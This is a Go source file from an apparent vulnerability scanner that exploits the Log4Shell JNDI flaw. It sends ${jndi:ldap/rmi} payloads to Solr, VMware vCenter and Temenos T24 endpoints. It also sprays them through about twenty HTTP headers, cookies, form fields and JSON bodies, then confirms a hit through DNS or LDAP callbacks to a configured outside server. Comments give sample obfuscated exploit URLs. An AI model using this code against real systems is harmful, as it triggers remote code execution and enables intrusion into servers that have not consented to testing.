package log4j

import (
	"fmt"
	"github.com/hktalent/ProScan4all/lib/util"
	"github.com/hktalent/ProScan4all/pkg/jndi"
	"net/url"
	"regexp"
	"strings"
)

// https://github.com/u21h2/nacs
// https://192.168.10.198/ui/#/login
// http://127.0.0.1:8983/solr/admin/cores?action=(){:;}{$:;$}{jndi:rmi${{::-:}}}//docker.for.mac.localhost:1099/UpX34defineClass}
// http://127.0.0.1:8983/solr/admin/cores?action=${jndi:${rmi://docker.for.mac.localhost:1099/UpX34defineClass}}
var UrlPayload = []string{"/solr/admin/cores?action=${jndi:%s}"}

var RegVCenter = regexp.MustCompile(`(http.*?\?SAMLRequest=)`)

func CheckX3(u string) bool {
	if oU, err := url.Parse(u); nil == err {
		a := []string{oU.Scheme + "://" + oU.Host + "/x3.jsp"}

		for _, k := range a {
			if r, err := util.DoPost(k, map[string]string{}, strings.NewReader("")); nil == err {
				defer r.Body.Close()
			}
		}

	}
	return false
}

// Temenos T24
// https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell?referrer=featured
func CheckTemenosT24(u string) {
	if oU, err := url.Parse(u); nil == err {
		szUrl := oU.Scheme + "://" + oU.Host + "/ui/login"
		if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
			defer r.Body.Close()
			if a := r.Header.Get("Location"); "" != a {
				if x := RegVCenter.FindAllString(a, -1); 0 < len(x) && -1 < strings.Index(x[0], "SAML2/SSO") {
					ldapServer := "${jndi:" + SetLdapHost(oU.Host) + "}"
					util.DoGet(x[0], map[string]string{
						"X-Forwarded-For": ldapServer,
					})
				}
			}
		}
	}
}

// 这里可以考虑对host进行编码，避免明文传输
func SetLdapHost(s string) string {
	return fmt.Sprintf(util.GetVal("ldapServer"), s)
}

func Solr(u string) {
	if oU, err := url.Parse(u); nil == err {
		for _, k := range UrlPayload {
			k = fmt.Sprintf(k, SetLdapHost(oU.Host))
			szUrl := oU.Scheme + "://" + oU.Host + k
			if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
				defer r.Body.Close()
			}
		}
	}
}

// https://www.sprocketsecurity.com/resources/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
func VCenter(u string) {
	if oU, err := url.Parse(u); nil == err {
		szUrl := oU.Scheme + "://" + oU.Host + "/ui/login"
		if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
			defer r.Body.Close()
			if a := r.Header.Get("Location"); "" != a {
				if x := RegVCenter.FindAllString(a, -1); 0 < len(x) && -1 < strings.Index(x[0], "SAML2/SSO") {
					ldapServer := "${jndi:" + SetLdapHost(oU.Host) + "}"
					util.DoGet(x[0], map[string]string{
						"X-Forwarded-For": ldapServer,
					})
				}
			}
		}
	}
}

func Check(u string, finalURL string) bool {
	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
		var host = "null"
		randomstr := util.RandomStr()
		if ux, err := url.Parse(strings.TrimSpace(u)); err == nil {
			host = strings.Replace(ux.Host, ":", ".", -1)
		}
		domainx, intputs := getinputurl(finalURL)
		domainx = append(domainx, u)
		intputs = append(intputs, "x")
		for _, domain := range domainx {
			for _, payload := range log4jJndiPayloads {
				var uri string
				if jndi.JndiAddress != "" {
					uri = jndi.JndiAddress + "/" + randomstr + "/"
				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
					uri = randomstr + "." + host + "." + util.CeyeDomain
				}
				payload = strings.Replace(payload, "dnslog-url", uri, -1)
				header := make(map[string]string)
				header["Content-Type"] = "application/x-www-form-urlencoded"
				header["User-Agent"] = payload
				header["Referer"] = payload
				header["X-Client-IP"] = payload
				header["X-Remote-IP"] = payload
				header["X-Remote-Addr"] = payload
				header["X-Forwarded-For"] = payload
				header["X-Originating-IP"] = payload
				header["Originating-IP"] = payload
				header["CF-Connecting_IP"] = payload
				header["True-Client-IP"] = payload
				header["Originating-IP"] = payload
				header["X-Real-IP"] = payload
				header["Forwarded"] = payload
				header["X-Api-Version"] = payload
				header["X-Wap-Profile"] = payload
				header["Contact"] = payload
				header["Forwarded"] = payload
				header["X-Device"] = payload
				header["Token"] = payload
				header["Cookie"] = "JSESSIONID=" + payload
				_, _ = util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
				_, _ = util.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
				_, _ = util.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
				header["Content-Type"] = "application/json"
				_, _ = util.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
			}
		}
		if jndi.JndiAddress != "" {
			if jndi.Jndilogchek(randomstr) {
				util.SendLog(finalURL, "log4j", "Found vuln Log4J JNDI RCE", "")
				return true
			}
		}
		if util.CeyeApi != "" && util.CeyeDomain != "" {
			if util.Dnslogchek(randomstr) {
				util.SendLog(finalURL, "log4j", "Found vuln Log4J JNDI RCE", "")
				return true
			}
		}
	}
	return false
}

func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
	req, err := util.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil, nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = util.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil, nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if util.StrContains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(strings.TrimSpace(domainurl))
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if util.StrContains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(strings.TrimSpace(domainurl))
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	inputreg := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?)['"].*?>`).FindAllStringSubmatch(req.Body, -1)
	for _, intput := range inputreg {
		inputlist = append(inputlist, intput[1])
	}
	return loginurl, inputlist
}
